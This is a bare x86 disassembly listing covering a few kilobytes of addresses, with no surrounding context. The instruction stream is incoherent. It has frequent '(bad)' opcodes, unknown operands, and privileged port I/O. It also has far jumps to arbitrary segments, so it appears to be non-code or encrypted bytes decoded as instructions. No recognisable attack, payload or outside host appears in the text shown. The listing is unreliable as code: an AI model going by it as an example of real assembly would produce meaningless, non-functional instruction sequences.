  415e35:	xor    ebx,DWORD PTR [ecx-0x63]
  415e38:	stc    
  415e39:	jae    0x415de1
  415e3b:	push   ebp
  415e3c:	jne    0x415e10
  415e3e:	ret    
  415e3f:	jmp    0x4bd9ed57
  415e44:	jge    0x415e96
  415e46:	ret    0x2369
  415e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e4a:	pusha  
  415e4b:	aas    
  415e4c:	adc    eax,0xdb85f547
  415e51:	ins    BYTE PTR es:[edi],dx
  415e52:	pop    eax
  415e53:	push   ecx
  415e54:	mov    esp,0x8a26f551
  415e59:	sub    ah,BYTE PTR [ebx]
  415e5b:	mov    cl,BYTE PTR [ebx+eax*8+0x76b30823]
  415e62:	dec    esp
  415e63:	outs   dx,DWORD PTR ds:[esi]
  415e64:	mov    ch,0x46
  415e66:	jp     0x415e5a
  415e68:	xor    ah,BYTE PTR [ebx+0x6a]
  415e6b:	xchg   esp,eax
  415e6c:	dec    esp
  415e6d:	pusha  
  415e6e:	in     al,0x7
  415e70:	sbb    al,0xd3
  415e72:	in     al,0x1b
  415e74:	push   cs
  415e75:	in     eax,0x48
  415e77:	cmp    al,0x3
  415e79:	xlat   BYTE PTR ds:[ebx]
  415e7a:	jecxz  0x415e1e
  415e7c:	inc    edx
  415e7d:	outs   dx,DWORD PTR ds:[esi]
  415e7e:	mov    ds:0x77baf980,al
  415e83:	fild   DWORD PTR gs:[ecx-0x4d00ec8e]
  415e8a:	sub    dl,ch
  415e8c:	dec    BYTE PTR [eax-0x10]
  415e8f:	xchg   DWORD PTR [ecx+0x29b12bd2],ebp
  415e95:	xchg   ebx,eax
  415e96:	and    cl,BYTE PTR [eax+0x68]
  415e99:	aam    0x7e
  415e9b:	xor    ecx,DWORD PTR [eax+esi*4-0x47]
  415e9f:	inc    esp
  415ea0:	je     0x415efe
  415ea2:	cmp    bl,0x9c
  415ea5:	jg     0x415eb5
  415ea7:	mov    ch,0x93
  415ea9:	push   ss
  415eaa:	cmc    
  415eab:	sbb    cl,al
  415ead:	enter  0xda49,0x40
  415eb1:	ds iret 
  415eb3:	outs   dx,BYTE PTR ds:[esi]
  415eb4:	loop   0x415f09
  415eb6:	fsub   QWORD PTR [ebx+edi*1+0x45]
  415eba:	jnp    0x415f22
  415ebc:	push   ebx
  415ebd:	fisub  WORD PTR [eax+0x70c6f5c0]
  415ec3:	xchg   ebx,eax
  415ec4:	in     al,dx
  415ec5:	mov    dh,0x10
  415ec7:	arpl   ax,bx
  415ec9:	mov    BYTE PTR [eax-0x2d],al
  415ecc:	inc    eax
  415ecd:	in     eax,dx
  415ece:	test   al,0x11
  415ed0:	xor    al,0xf1
  415ed2:	inc    eax
  415ed3:	retf   0xf0cc
  415ed6:	pop    ds
  415ed7:	push   0x7fc8721f
  415edc:	popa   
  415edd:	sar    al,cl
  415edf:	sbb    cl,al
  415ee1:	ds xchg esp,eax
  415ee3:	test   DWORD PTR [edi],ebp
  415ee5:	gs inc eax
  415ee7:	sub    BYTE PTR [edx+0x374aeb9a],0x34
  415eee:	push   0x38
  415ef0:	repz mov dh,0x31
  415ef3:	mov    ds:0x9f1884a2,al
  415ef8:	rcl    BYTE PTR [esi+0xd671bc6],cl
  415efe:	mov    dl,0xb3
  415f00:	outs   dx,BYTE PTR ds:[esi]
  415f01:	scas   al,BYTE PTR es:[edi]
  415f02:	xor    ebp,0x7b
  415f05:	call   0xb5644753
  415f0a:	sbb    al,0xb8
  415f0c:	ss pop ss
  415f0e:	or     DWORD PTR [eax-0x5e],ebx
  415f11:	or     DWORD PTR [eax+0x62],ebp
  415f14:	mov    ch,dl
  415f16:	xor    ebx,edi
  415f18:	mov    edi,0x4801f60
  415f1d:	popf   
  415f1e:	xor    al,0xf7
  415f20:	std    
  415f21:	shl    DWORD PTR [ebx+0x43],1
  415f24:	jmp    0x5025:0x163f8422
  415f2b:	ret    
  415f2c:	sbb    esp,DWORD PTR [edx+0x48]
  415f2f:	fisttp WORD PTR [ebx]
  415f31:	jle    0x415f60
  415f33:	cmp    BYTE PTR [ecx+0x797c3b83],0x24
  415f3a:	adc    ebx,DWORD PTR [ecx-0x1d]
  415f3d:	push   0x3896afea
  415f42:	test   DWORD PTR [esi+0x17c47482],esi
  415f48:	call   0xe180:0xa04d64e6
  415f4f:	imul   edx,esp,0x5c
  415f52:	sbb    bh,dl
  415f54:	out    0xd2,eax
  415f56:	jbe    0x415f25
  415f58:	xchg   ebx,ecx
  415f5a:	das    
  415f5b:	sub    BYTE PTR [edx],dl
  415f5d:	ja     0x415fcd
  415f5f:	fwait
  415f60:	mov    bl,0xce
  415f62:	mov    ds:0xb7ab3fd3,eax
  415f67:	imul   esi,DWORD PTR [edx+0x342b30db],0xc39c659b
  415f71:	mov    ds:0xa236a0b3,eax
  415f76:	push   0xffffff92
  415f78:	cmp    eax,ebp
  415f7a:	or     al,0xbc
  415f7c:	push   eax
  415f7d:	mov    ds:0x3a3a696e,eax
  415f82:	mov    ch,0xd1
  415f84:	or     bl,dh
  415f86:	clc    
  415f87:	fsubrp st(5),st
  415f89:	outs   dx,BYTE PTR ds:[esi]
  415f8a:	rol    dl,1
  415f8c:	addr16 fwait
  415f8e:	jl     0x415f53
  415f90:	jmp    0x9d7e2705
  415f95:	mov    dh,dl
  415f97:	xchg   edi,eax
  415f98:	xchg   edi,eax
  415f99:	adc    al,0xc
  415f9b:	push   cs
  415f9c:	xor    eax,0x3825b39d
  415fa1:	xor    ah,BYTE PTR [eax]
  415fa3:	int    0xd
  415fa5:	stc    
  415fa6:	ret    
  415fa7:	and    DWORD PTR [ecx-0x21aa87b8],0xffffff8a
  415fae:	push   eax
  415faf:	aaa    
  415fb0:	(bad)  
  415fb2:	jle    0x415f7e
  415fb4:	ret    
  415fb5:	lods   eax,DWORD PTR ds:[esi]
  415fb6:	ficom  WORD PTR [ecx-0x3fe80f05]
  415fbc:	mov    DWORD PTR [edx-0x531ae45a],ebp
  415fc2:	mov    edx,0x7fbaaa5
  415fc7:	push   ebp
  415fc8:	int3   
  415fc9:	push   ebp
  415fca:	clc    
  415fcb:	retf   0xd643
  415fce:	jbe    0x415f87
  415fd0:	addr16 inc edi
  415fd2:	jbe    0x415f6e
  415fd4:	stos   DWORD PTR es:[di],eax
  415fd6:	xor    edi,edx
  415fd8:	(bad)  
  415fd9:	dec    edi
  415fda:	mov    DWORD PTR [edx+0x2a],ebx
  415fdd:	jnp    0x415f73
  415fdf:	sbb    eax,DWORD PTR [ebx]
  415fe1:	sbb    eax,0x20c45a7b
  415fe6:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe8:	xor    BYTE PTR [ebx+0x2cf21e16],al
  415fee:	nop
  415fef:	js     0x415f73
  415ff1:	cmc    
  415ff2:	cmp    BYTE PTR ds:0x39046e3a,dh
  415ff8:	jmp    0x415f81
  415ffa:	inc    ebp
  415ffb:	sbb    BYTE PTR [edi],0xf4
  415ffe:	fld    DWORD PTR [esi]
  416000:	dec    esi
  416001:	jae    0x416037
  416003:	(bad)  
  416004:	mov    ah,0x70
  416006:	aad    0x93
  416008:	jmp    0x416078
  41600a:	and    al,0x53
  41600c:	mov    bh,0xbd
  41600e:	pop    es
  41600f:	mov    cl,0x4c
  416011:	out    dx,al
  416012:	pop    edi
  416013:	imul   ebp,edx,0x61
  416016:	sbb    esp,DWORD PTR [edx]
  416018:	sbb    DWORD PTR [edx],edi
  41601a:	mov    bl,0x76
  41601c:	cdq    
  41601d:	jmp    ecx
  41601f:	mov    ?,WORD PTR [edi]
  416021:	in     eax,0xd6
  416023:	xor    dh,dh
  416025:	in     al,0xd1
  416027:	cdq    
  416028:	dec    edi
  416029:	add    eax,0x2efc8666
  41602e:	xlat   BYTE PTR ds:[ebx]
  41602f:	shl    eax,1
  416031:	pop    ds
  416032:	in     eax,dx
  416033:	xor    esi,DWORD PTR [ebp+0x5fd4ed60]
  416039:	jno    0x416098
  41603b:	push   esi
  41603c:	hlt    
  41603d:	mov    edi,0x391b1149
  416042:	pop    ebp
  416043:	and    DWORD PTR [eax-0x1],0x628862a4
  41604a:	ret    
  41604b:	test   al,0xdb
  41604d:	add    DWORD PTR [edx],ebx
  41604f:	aad    0x92
  416051:	cmp    al,0xa9
  416053:	or     edx,DWORD PTR [edx+0x79]
  416056:	cmp    DWORD PTR [eax-0x53],esi
  416059:	ret    0x137c
  41605c:	xor    al,0xe3
  41605e:	dec    ebx
  41605f:	inc    esi
  416060:	jns    0x4160bf
  416062:	stos   BYTE PTR es:[edi],al
  416063:	ins    BYTE PTR es:[edi],dx
  416064:	nop
  416065:	es inc esi
  416067:	imul   ebx,ebp,0xffffffd1
  41606a:	jbe    0x41602b
  41606c:	xor    edi,DWORD PTR [eax-0x95f4c00]
  416072:	ds inc edi
  416074:	add    al,0xb
  416076:	imul   edx,edi,0x98afabc3
  41607c:	mov    cl,al
  41607e:	push   0x33c36553
  416083:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416085:	inc    ebp
  416086:	or     eax,0xfe3639f8
  41608b:	jle    0x41601a
  41608d:	call   0xe2309f01
  416092:	add    ebp,DWORD PTR [eax-0x27]
  416095:	pushf  
  416096:	xchg   ebp,eax
  416097:	test   BYTE PTR [edi+0x2dbd40f8],ah
  41609d:	mov    esi,0x2eb76d29
  4160a2:	out    dx,eax
  4160a3:	shl    DWORD PTR [edi-0x10],0x8d
  4160a7:	sbb    ebp,edi
  4160a9:	add    al,bl
  4160ab:	mov    bh,0x59
  4160ad:	jecxz  0x416084
  4160af:	mov    ch,BYTE PTR [esi+0x396646ed]
  4160b5:	test   al,0x90
  4160b7:	or     al,0x5
  4160ba:	call   0x4945:0xcaf98ce6
  4160c1:	push   ebx
  4160c2:	push   edx
  4160c3:	and    esp,DWORD PTR [edx]
  4160c5:	ja     0x4160a8
  4160c7:	scas   eax,DWORD PTR es:[edi]
  4160c8:	and    ecx,DWORD PTR [ecx-0x10]
  4160cb:	retf   0x5db5
  4160ce:	out    dx,al
  4160cf:	(bad)  
  4160d0:	daa    
  4160d1:	outs   dx,DWORD PTR ds:[esi]
  4160d2:	shl    DWORD PTR [ebp-0x1876e3b2],cl
  4160d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160d9:	gs call 0xf4e1:0x76626981
  4160e1:	add    ecx,DWORD PTR [ecx]
  4160e3:	or     BYTE PTR [ebp+0x63],bl
  4160e6:	jge    0x416150
  4160e8:	(bad)  [edx+edi*4+0x12d51e61]
  4160ef:	stc    
  4160f0:	add    edi,DWORD PTR [ecx+0x42]
  4160f3:	mov    edi,0x4d7cddff
  4160f8:	stc    
  4160f9:	fs jo  0x4160f4
  4160fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160fd:	hlt    
  4160fe:	loop   0x4160e0
  416100:	adc    eax,0x599323be
  416105:	mov    edi,0xdaa2d24a
  41610a:	fwait
  41610b:	lahf   
  41610c:	fcomi  st,st(4)
  41610e:	pop    ebp
  41610f:	jmp    DWORD PTR [edi+0x4a3b217a]
  416115:	pop    eax
  416116:	or     al,0x36
  416118:	repz adc eax,0xec95fb03
  41611e:	sub    ebx,DWORD PTR [eax+0x460ca9c]
  416124:	xor    ebp,esi
  416126:	(bad)  
  416127:	push   eax
  416128:	xchg   esi,eax
  416129:	adc    eax,0x8a41b1bb
  41612e:	pop    ebp
  41612f:	out    dx,eax
  416130:	pop    es
  416131:	idiv   BYTE PTR [esi-0x48707e4e]
  416137:	adc    eax,0x5398ae2b
  41613c:	add    eax,0x4edf308d
  416141:	test   al,0xf
  416143:	sub    al,0xa
  416145:	out    0xfa,eax
  416147:	fstp   QWORD PTR [esi+eiz*8]
  41614a:	ds pusha 
  41614c:	mov    al,ds:0x70fa87c4
  416151:	and    BYTE PTR [ebx],bl
  416153:	or     DWORD PTR [ebx+0x25],0xbc54aadd
  41615a:	call   0x7e90:0x10cf4404
  416161:	pop    eax
  416162:	sbb    eax,DWORD PTR [edx]
  416164:	loopne 0x4160f7
  416166:	jle    0x41615b
  416168:	xchg   edx,eax
  416169:	loope  0x41619c
  41616b:	mov    ss,WORD PTR [eax+eax*8]
  41616e:	lods   eax,DWORD PTR ds:[esi]
  41616f:	out    0x4f,al
  416171:	adc    ebx,eax
  416173:	or     BYTE PTR ds:0xa959319a,al
  416179:	xchg   cl,dh
  41617b:	in     eax,dx
  41617c:	adc    ecx,DWORD PTR [esi+0x5b73a2ea]
  416182:	repnz mov dl,0xec
  416185:	rcl    DWORD PTR [edi+0x64],cl
  416188:	stos   BYTE PTR es:[edi],al
  416189:	adc    DWORD PTR [eax],esi
  41618b:	jp     0x4161a8
  41618d:	rcr    DWORD PTR [ecx-0x16],cl
  416190:	test   DWORD PTR [ecx+0x6],ecx
  416193:	in     eax,0x4c
  416195:	dec    esp
  416196:	adc    BYTE PTR ds:0xa0c5aea9,bh
  41619c:	lahf   
  41619d:	aad    0x35
  41619f:	scas   al,BYTE PTR es:[edi]
  4161a0:	add    ecx,DWORD PTR [edx-0x20]
  4161a3:	mov    ss,WORD PTR [esi-0x65]
  4161a6:	push   ecx
  4161a7:	into   
  4161a8:	fstp   st(7)
  4161aa:	xor    al,0xd5
  4161ac:	inc    edi
  4161ad:	xchg   esi,eax
  4161ae:	xor    edx,DWORD PTR [eax-0x1ac12964]
  4161b4:	lods   eax,DWORD PTR ds:[esi]
  4161b5:	daa    
  4161b6:	cmp    dl,ch
  4161b8:	shr    edx,cl
  4161ba:	popa   
  4161bb:	inc    esi
  4161bc:	clc    
  4161bd:	lds    ebx,FWORD PTR [eax-0x10]
  4161c0:	jns    0x41620c
  4161c2:	xchg   esp,eax
  4161c3:	(bad)  
  4161c4:	repz mov ch,0xc9
  4161c7:	fs inc ebx
  4161c9:	inc    edx
  4161ca:	retf   
  4161cb:	xchg   edx,eax
  4161cc:	inc    edx
  4161cd:	xchg   edi,eax
  4161ce:	add    ebp,DWORD PTR [edx]
  4161d0:	jns    0x416184
  4161d2:	(bad)  
  4161d3:	jb     0x416169
  4161d5:	mov    WORD PTR [ebx+0x55],?
  4161d8:	in     al,0xfb
  4161da:	fwait
  4161db:	aaa    
  4161dc:	pop    esp
  4161dd:	cmc    
  4161de:	ficomp DWORD PTR [ebx-0x68]
  4161e1:	pop    edi
  4161e2:	lds    ebp,FWORD PTR [edi-0x7f]
  4161e5:	rcl    esi,1
  4161e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e8:	(bad)
  4161ec:	bound  esp,QWORD PTR [edx+0x2934fd7b]
  4161f2:	es ja  0x4161ac
  4161f5:	into   
  4161f6:	fild   QWORD PTR [ecx+eax*1]
  4161f9:	rcr    DWORD PTR [ebp-0xf],1
  4161fc:	pop    esp
  4161fd:	dec    edx
  4161fe:	adc    DWORD PTR [ebp+0x5f],ebx
  416201:	cmc    
  416202:	test   eax,0xb3e22868
  416207:	ins    BYTE PTR es:[edi],dx
  416208:	pop    es
  416209:	push   DWORD PTR [eax+ebx*1]
  41620c:	or     DWORD PTR [esi],edx
  41620e:	adc    BYTE PTR ds:0xeb3589de,ah
  416214:	nop
  416215:	out    0xd6,al
  416217:	fnstsw WORD PTR [ecx+0x70c2f392]
  41621d:	jns    0x416200
  41621f:	out    0x6c,al
  416221:	dec    esp
  416222:	pop    eax
  416223:	(bad)  
  416224:	push   edi
  416225:	imul   esp,DWORD PTR [ebp+0x453fa347],0xd27217f7
  41622f:	icebp  
  416230:	sbb    BYTE PTR [ecx+0x52],bh
  416233:	push   es
  416234:	sbb    eax,0x3da3e717
  416239:	mov    dl,0xb5
  41623b:	ja     0x41621d
  41623d:	sbb    eax,0x122f2bfe
  416242:	dec    eax
  416243:	cmp    DWORD PTR [edx+0x2d],ecx
  416246:	sub    ecx,DWORD PTR [esi]
  416248:	xchg   esp,eax
  416249:	push   ss
  41624a:	scas   al,BYTE PTR es:[edi]
  41624b:	aas    
  41624c:	jmp    0x5fbe:0x56a931d8
  416253:	gs loope 0x4162bc
  416256:	(bad)  
  416257:	out    dx,eax
  416258:	lock sub eax,0xefd0bd56
  41625e:	adc    eax,0xbfbefcbe
  416263:	xchg   ebp,eax
  416264:	pop    esi
  416265:	jno    0x4161fc
  416267:	xor    bh,BYTE PTR [ecx-0x177400c]
  41626d:	pop    es
  41626e:	mov    dx,WORD PTR [edi-0x70]
  416272:	test   eax,0xfb5e7d6d
  416277:	dec    eax
  416278:	dec    ebx
  416279:	jns    0x416210
  41627b:	or     DWORD PTR [ecx],0xfffffffe
  41627e:	push   0x3f83af77
  416283:	jge    0x4162eb
  416285:	(bad)  
  416286:	inc    edi
  416287:	(bad)  gs:[ebp+eax*4-0x1a4ce73b]
  41628f:	inc    ecx
  416290:	cmp    al,BYTE PTR [esi+0x56]
  416293:	sbb    DWORD PTR [edx+edx*4],0x1059c724
  41629a:	gs (bad) 
  41629c:	scas   eax,DWORD PTR es:[edi]
  41629d:	ins    BYTE PTR es:[edi],dx
  41629e:	lds    ebx,FWORD PTR [esi]
  4162a0:	or     edx,DWORD PTR [ecx]
  4162a2:	add    esi,DWORD PTR [ecx]
  4162a4:	call   0x3627:0x2e41b534
  4162ab:	test   BYTE PTR [edi],bh
  4162ad:	xchg   ecx,eax
  4162ae:	(bad)  
  4162af:	mov    fs,WORD PTR [ebp+0x704b8a1e]
  4162b5:	and    DWORD PTR [edx-0x7e],ecx
  4162b8:	pop    edx
  4162b9:	pop    ecx
  4162ba:	aad    0x6d
  4162bc:	xchg   esp,eax
  4162bd:	mov    ch,0x89
  4162bf:	pop    ds
  4162c0:	dec    ebp
  4162c1:	push   esp
  4162c2:	bound  eax,QWORD PTR [esi]
  4162c4:	and    eax,0xcf15664e
  4162c9:	fild   DWORD PTR [esi-0x40]
  4162cc:	loop   0x416275
  4162ce:	in     al,dx
  4162cf:	push   ebx
  4162d0:	xor    al,0xd2
  4162d2:	test   DWORD PTR [edx-0x25888335],0x871fe84b
  4162dc:	dec    ecx
  4162dd:	adc    esp,DWORD PTR [ecx-0x18]
  4162e0:	icebp  
  4162e1:	adc    al,0x8c
  4162e3:	pop    edx
  4162e4:	lock push ebp
  4162e6:	aaa    
  4162e7:	and    eax,0xc337751a
  4162ec:	out    0x44,eax
  4162ee:	adc    eax,0x45592c6f
  4162f3:	mov    ecx,DWORD PTR [edi]
  4162f5:	dec    ebx
  4162f6:	pushf  
  4162f7:	stos   BYTE PTR es:[edi],al
  4162f8:	frstor [edx+0x6e406b53]
  4162fe:	mov    bh,0x93
  416300:	adc    DWORD PTR ds:0xae3b1f9e,edx
  416306:	xlat   BYTE PTR ds:[ebx]
  416307:	cmp    ch,BYTE PTR [ebp+0xe]
  41630a:	xchg   ecx,eax
  41630b:	cmp    esp,esi
  41630d:	sbb    eax,0xef49137b
  416312:	test   al,0xe6
  416314:	in     eax,dx
  416315:	lds    esi,FWORD PTR [eax+0x35]
  416318:	fs mov ah,0xd4
  41631b:	loopne 0x4162ad
  41631d:	mov    eax,0xf3b31e9a
  416322:	or     DWORD PTR [edi],edx
  416324:	or     eax,0x658e6641
  416329:	ror    DWORD PTR [edi-0x8],0x5d
  41632d:	stos   DWORD PTR es:[edi],eax
  41632e:	xchg   edi,eax
  41632f:	ja     0x4162b4
  416331:	test   esi,esp
  416333:	add    DWORD PTR [ebp-0x66],ecx
  416336:	and    eax,0xba8672d0
  41633b:	repz lock fs inc esi
  41633f:	bound  ebx,QWORD PTR [ecx-0x775d04f9]
  416345:	lods   eax,DWORD PTR ds:[esi]
  416346:	push   ds
  416347:	cmp    al,0x3e
  416349:	adc    eax,0xfddb303d
  41634e:	xor    DWORD PTR [edi+0x225675f8],edx
  416354:	inc    esp
  416355:	ret    
  416356:	es sti 
  416358:	xor    ecx,DWORD PTR [ebp-0x3e]
  41635b:	add    eax,0xde42d518
  416360:	xor    BYTE PTR [edx+eiz*2-0x68247de2],bl
  416367:	stc    
  416368:	sar    DWORD PTR [ecx],0xf4
  41636b:	jns    0x416316
  41636d:	loop   0x41635b
  41636f:	jne    0x416362
  416371:	or     ah,dl
  416373:	das    
  416374:	add    DWORD PTR [edx+esi*1-0x4b],ebx
  416378:	ss pushf 
  41637a:	push   ebp
  41637b:	fadd   QWORD PTR [edx+0x19e4ae93]
  416381:	sub    ebx,DWORD PTR [ebx+0x16]
  416384:	repnz push eax
  416386:	imul   ebx,edx,0xcf2855fc
  41638c:	scas   eax,DWORD PTR es:[edi]
  41638d:	(bad)  
  41638f:	sbb    eax,0x5a2a3333
  416394:	mov    bh,0x1b
  416396:	xchg   ecx,eax
  416397:	retf   
  416398:	cmp    BYTE PTR [ecx+0x5bc7abb2],0x81
  41639f:	test   DWORD PTR [edx-0x5e],edx
  4163a2:	loop   0x416397
  4163a4:	arpl   WORD PTR [ebp+0xd96a19e],bx
  4163aa:	pop    edx
  4163ab:	fsubr  DWORD PTR [esi+0x25]
  4163ae:	call   0xb480:0xabeae307
  4163b5:	push   ds
  4163b6:	add    edi,DWORD PTR [eax]
  4163b8:	adc    ah,dl
  4163ba:	mov    cl,0xd3
  4163bc:	test   BYTE PTR [eax-0x25],0x7b
  4163c0:	inc    eax
  4163c1:	adc    BYTE PTR [ebp-0x6e72251],0x42
  4163c8:	repz fild QWORD PTR [esi]
  4163cb:	adc    DWORD PTR [edi-0x66],0x85664f32
  4163d2:	dec    edx
  4163d3:	lahf   
  4163d4:	cmp    BYTE PTR [ebx-0x1b250bdd],dh
  4163da:	mov    ecx,0xb28eb7ea
  4163df:	or     DWORD PTR [ebp+0x50],edx
  4163e2:	push   ebx
  4163e3:	and    al,0xc5
  4163e5:	leave  
  4163e6:	mov    cl,0xad
  4163e8:	fstp   st(1)
  4163ea:	jno    0x4163b1
  4163ec:	ror    BYTE PTR [esp+eax*2+0x39f5b01d],0x89
  4163f4:	mov    dh,0xb1
  4163f6:	and    al,BYTE PTR [ebx+0x1ac1ae8d]
  4163fc:	xchg   ebx,eax
  4163fd:	adc    al,dl
  4163ff:	cld    
  416400:	mov    ebp,0xac8c0a09
  416405:	push   ebx
  416406:	jmp    0x4163e7
  416408:	fnstsw WORD PTR ds:0x2bad289f
  41640e:	sub    dl,ch
  416410:	adc    BYTE PTR [edx+edx*2+0x7cce2694],cl
  416417:	ins    BYTE PTR es:[edi],dx
  416418:	pop    es
  416419:	mov    ebx,0x7aca1b8
  41641e:	mov    esi,0x23762e29
  416423:	mov    cl,0xed
  416425:	mov    ah,0xb1
  416427:	sub    DWORD PTR [eax+0x30],ecx
  41642a:	xchg   bl,cl
  41642c:	scas   al,BYTE PTR es:[edi]
  41642d:	mov    ecx,0x45439f8f
  416432:	and    bl,BYTE PTR [edi-0x12a9cc6]
  416438:	pop    esp
  416439:	sub    al,0x2a
  41643b:	(bad)  
  41643c:	ss pop ebp
  41643e:	add    eax,0x1bab661
  416443:	sub    al,0x52
  416445:	adc    al,0x45
  416447:	push   ds
  416448:	push   cs
  416449:	xchg   edi,eax
  41644a:	mov    ebx,0x3f0a1aa
  41644f:	jmp    0x994eda28
  416454:	cmc    
  416455:	cld    
  416456:	jae    0x4164d5
  416458:	imul   ebp,ebp,0xfffffff4
  41645b:	xchg   edx,eax
  41645c:	dec    esi
  41645d:	xchg   esi,eax
  41645e:	arpl   WORD PTR [eax],ax
  416460:	imul   ebx,DWORD PTR [ebx],0x30
  416463:	cli    
  416464:	mov    bh,0x93
  416466:	fist   WORD PTR [edi]
  416468:	cmp    bh,BYTE PTR [esi-0x48101fc2]
  41646e:	call   0xac63:0xc52d970a
  416475:	mov    ch,bh
  416477:	ins    BYTE PTR es:[edi],dx
  416478:	ja     0x4164a1
  41647a:	or     BYTE PTR [edx],cl
  41647c:	addr16 loope 0x41643f
  41647f:	push   0x1a2f1195
  416484:	aad    0x8c
  416486:	push   ds
  416487:	pop    ebp
  416488:	dec    ebx
  416489:	sbb    edx,ecx
  41648b:	jmp    0xc1ab:0xfc0b3af6
  416492:	and    DWORD PTR [eax+0x51],edi
  416495:	cld    
  416496:	adc    dl,dh
  416498:	aad    0xc3
  41649a:	dec    ebp
  41649b:	test   eax,0xc2def3b4
  4164a0:	das    
  4164a1:	xchg   DWORD PTR [ecx],esi
  4164a3:	(bad)  
  4164a4:	push   ecx
  4164a5:	cli    
  4164a6:	dec    esi
  4164a7:	jle    0x416474
  4164a9:	test   BYTE PTR [edi],0xf8
  4164ac:	loope  0x4164e3
  4164ae:	cmp    al,0xad
  4164b0:	iret   
  4164b1:	je     0x41651c
  4164b3:	dec    eax
  4164b4:	outs   dx,BYTE PTR ds:[esi]
  4164b5:	es sbb al,0xa2
  4164b8:	xor    al,0xfa
  4164ba:	sub    DWORD PTR ds:0x9dd58e85,eax
  4164c0:	jae    0x4164e5
  4164c2:	les    ebx,FWORD PTR ds:0x35cd1d8e
  4164c8:	inc    ecx
  4164c9:	push   0xffffffd2
  4164cb:	push   0xffffffcc
  4164cd:	push   esi
  4164ce:	rcr    al,1
  4164d0:	dec    edi
  4164d1:	jo     0x416511
  4164d3:	loope  0x416543
  4164d5:	jb     0x4164a9
  4164d7:	icebp  
  4164d8:	jo     0x416557
  4164da:	(bad)
  4164de:	mov    ebp,0x2465e193
  4164e3:	sti    
  4164e4:	retf   0x9db9
  4164e7:	inc    esp
  4164e8:	mov    al,ds:0x8d9c4d54
  4164ed:	push   eax
  4164ee:	push   cs
  4164ef:	pop    ds
  4164f0:	xchg   edi,eax
  4164f1:	aaa    
  4164f2:	or     bh,BYTE PTR [eax+0x435cb2c1]
  4164f8:	in     al,dx
  4164f9:	xor    ah,bh
  4164fb:	je     0x416518
  4164fd:	pop    eax
  4164fe:	and    BYTE PTR [edi],0x46
  416501:	pop    edi
  416502:	jg     0x4164e0
  416504:	dec    ecx
  416505:	in     eax,dx
  416506:	je     0x416539
  416508:	mov    eax,0x7dd10d36
  41650d:	mov    ebx,0x65178680
  416512:	(bad)  
  416513:	imul   edx,edi,0xe85e8c1c
  416519:	add    eax,0x6ca43931
  41651e:	jmp    0x97d93403
  416523:	faddp  st(1),st
  416525:	jne    0x41654f
  416527:	mov    esi,0x5121b1c5
  41652c:	addr16 and esi,ebp
  41652f:	imul   edi,DWORD PTR [edi-0x49ed57f0],0xcdeb2de3
  416539:	dec    edi
  41653a:	and    eax,0x46bd9787
  41653f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416541:	dec    edi
  416542:	in     eax,dx
  416543:	and    eax,0x712c42cc
  416548:	pushf  
  416549:	mov    ebx,DWORD PTR [ebp+0x4f90e105]
  41654f:	jle    0x416509
  416551:	dec    edx
  416552:	and    BYTE PTR [ebp-0x7a90d121],al
  416558:	pop    ecx
  416559:	mov    ah,0x4e
  41655c:	xchg   BYTE PTR [edx],dh
  41655e:	hlt    
  41655f:	repnz pop eax
  416561:	rcl    BYTE PTR [edx],1
  416563:	sbb    al,0x55
  416565:	and    edx,DWORD PTR [ebx+0x31]
  416568:	sbb    eax,0x91807973
  41656d:	mov    ah,0xcb
  41656f:	cld    
  416570:	hlt    
  416571:	pop    es
  416572:	shl    DWORD PTR [edx+esi*8-0x51],1
  416576:	imul   edx,DWORD PTR [eax+0x18],0x76
  41657a:	jae    0x4165a5
  41657c:	add    DWORD PTR [edx],0x37
  41657f:	aaa    
  416580:	out    0xe1,eax
  416582:	push   edx
  416583:	jmp    0x416530
  416585:	push   edx
  416586:	xlat   BYTE PTR ds:[ebx]
  416587:	test   edx,edi
  416589:	in     al,0xc0
  41658b:	or     ebx,esi
  41658d:	cmp    al,0x39
  41658f:	popa   
  416590:	push   0x29
  416592:	aaa    
  416593:	ror    edi,cl
  416595:	(bad)  
  416596:	xor    DWORD PTR [ecx+0x17],ebp
  416599:	out    0x19,al
  41659b:	xor    eax,0x285cecd1
  4165a0:	cmp    ch,BYTE PTR [ebx-0x35]
  4165a3:	dec    ebp
  4165a4:	sbb    DWORD PTR [edx],ecx
  4165a6:	(bad)  
  4165a7:	sub    DWORD PTR [ebp-0x3d],eax
  4165aa:	popf   
  4165ab:	daa    
  4165ac:	mov    ch,0xb3
  4165ae:	add    BYTE PTR [esi+edi*1+0x66],bl
  4165b2:	popa   
  4165b3:	mov    ah,dh
  4165b5:	loopne 0x416537
  4165b7:	aad    0x18
  4165b9:	pop    ecx
  4165ba:	mov    bh,0x9c
  4165bc:	(bad)  
  4165bd:	std    
  4165be:	stos   BYTE PTR es:[edi],al
  4165bf:	jmp    0x416595
  4165c1:	call   FWORD PTR [eax-0x61]
  4165c4:	jb     0x416623
  4165c6:	mov    DWORD PTR fs:[eax-0x18],ebp
  4165ca:	mov    al,0x99
  4165cc:	mov    edi,0xa2e02fb9
  4165d1:	mov    esp,0x1659d29
  4165d6:	pop    eax
  4165d7:	xor    DWORD PTR [edx+0x2],ebx
  4165da:	pop    ds
  4165db:	push   ebp
  4165dc:	fiadd  DWORD PTR [ebx+0x5e419cf6]
  4165e2:	(bad)  
  4165e4:	xchg   esp,eax
  4165e5:	pushf  
  4165e6:	aas    
  4165e7:	dec    ebx
  4165e8:	imul   edx,DWORD PTR [ebx],0xeca2d9fc
  4165ee:	ror    edx,1
  4165f0:	pop    eax
  4165f1:	popa   
  4165f2:	push   ecx
  4165f3:	jno    0x416631
  4165f5:	lods   al,BYTE PTR ds:[esi]
  4165f6:	nop
  4165f7:	(bad)  
  4165f8:	mov    esp,0x4fabc5b3
  4165fd:	xor    eax,0x3dd974e8
  416602:	mov    al,0xd9
  416604:	scas   al,BYTE PTR es:[edi]
  416605:	mov    dl,al
  416607:	push   ss
  416608:	lods   eax,DWORD PTR ds:[esi]
  416609:	mov    ?,WORD PTR [edi]
  41660b:	sub    DWORD PTR [edi+0x4f],edx
  41660e:	sub    DWORD PTR [ecx],edi
  416610:	jae    0x41662a
